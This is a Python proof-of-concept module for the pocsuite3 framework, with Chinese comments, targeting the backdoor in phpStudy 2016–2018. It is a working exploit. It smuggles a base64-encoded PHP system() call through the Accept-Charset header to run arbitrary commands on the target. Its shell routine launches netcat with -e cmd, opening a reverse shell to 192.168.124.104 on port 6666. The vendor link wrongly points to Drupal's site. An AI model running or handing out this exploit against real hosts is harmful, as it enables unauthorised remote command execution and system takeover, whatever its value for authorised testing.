from collections import OrderedDict
from pocsuite3.api import (
    Output,
    POCBase,
    random_str,
    POC_CATEGORY,
    register_poc,
    requests,
    logger,
    VUL_TYPE,
    get_listener_ip,
    get_listener_port,
)
from pocsuite3.lib.core.interpreter_option import (
    OptString,
    OptDict,
    OptIP,
    OptPort,
    OptBool,
    OptInteger,
    OptFloat,
    OptItems,
)
from pocsuite3.modules.listener import REVERSE_PAYLOAD
import base64


class PhpstudyPoc(POCBase):
    vulID = ""  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "callmeakun"  # PoC作者的大名
    vulDate = "2025-02-28"  # 漏洞公开的时间,不知道就写今天
    createDate = "2025-02-28"  # 编写 PoC 的日期
    updateDate = "2025-02-28"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.freebuf.com/articles/web/215823.html"]  # 漏洞地址来源,0day不用写
    name = "phpstudy_远程_RCE_后门-PoC"  # PoC 名称
    appPowerLink = "https://www.drupal.org/"  # 漏洞厂商主页地址
    appName = "phpstudy"  # 漏洞应用名称
    appVersion = "phpStudy2016_phpStudy2018"  # 漏洞影响版本
    vulType = "RCE"  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = ['http://127.0.0.1/l.php']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
            phpStudy 2016 - 2018 部分php版本存在后⻔，攻击者可以利⽤该后⻔，实现远程代码
            执⾏攻击。
        """  # 漏洞简要描述
    pocDesc = """
            poc的用法描述
        """  # POC用法描述


    # 获取本脚本的参数信息
    def _options(self):
        opt = OrderedDict()  # value = self.get_option('key')
        opt["cmd"] = OptString("ipconfig", description="指定一个执行命令指令", require=True)

        return opt

    def exploit(self,param):
        excute_cmd = f"system('{param}');"
        print(excute_cmd)

        base64_excute_cmd = base64.b64encode(excute_cmd.encode()).decode()

        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
        'Accept-Charset': f'{base64_excute_cmd}',
        'Accept-Encoding': 'gzip,deflate'
        }

        result = requests.get(self.url, headers=headers)


        return result

    # 漏洞的核心方法
    def _exploit(self, param=''):
        #加截断标识
        param = f"echo 11111111&&{param}&&echo 22222222"
        # headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        excute_cmd = f"system('{param}');"

        print(excute_cmd)

        base64_excute_cmd = base64.b64encode(excute_cmd.encode()).decode()
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0',
        'Accept-Charset': f'{base64_excute_cmd}',
        'Accept-Encoding': 'gzip,deflate'
        }

        res = requests.get(self.url, headers=headers)

        # 处理返回信息
        respond = res.content[res.content.find(b'11111111') + 8:res.content.find(b'22222222')]
        # result = respond.decode('GBK')
        logger.debug(respond)
        return respond

    # 如果命令行不带参数，_verify就会默认执行
    def _verify(self):
        result = {}
        flag = random_str(6)
        param = f'echo {flag}'
        res = self._exploit(param)
        print(type(res))
        if res and flag in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo'][param] = flag
        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)


    def _attack(self):
        result = {}
        # self.get_option() 方法可以获取自定义的命令行参数
        param = self.get_option('cmd')
        res = self._exploit(param)
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
        result['VerifyInfo'][param] = res
        # 统一调用 self.parse_output() 返回结果
        return self.parse_output(result)

    def _shell(self):
        pss = "nc.exe 192.168.124.104 6666 -e cmd"
        try:
            result = self.exploit(pss)
            print(result)
        except Exception:
            pass
        else:
            return self.parse_output(result)




# 注册 DemoPOC 类
register_poc(PhpstudyPoc)
